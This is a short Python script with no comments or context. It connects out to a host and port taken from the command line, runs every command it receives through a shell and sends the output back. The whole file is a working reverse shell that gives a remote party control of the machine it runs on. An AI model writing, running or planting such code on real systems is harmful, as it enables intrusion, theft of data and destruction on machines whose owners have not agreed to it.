#!/usr/bin/python

import os
import sys
import socket
import subprocess

def shell():
    while True:
        command = sock.recv(1024)
        output = subprocess.check_output(command, shell=True)
        sock.send(output)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))

shell()
sock.close()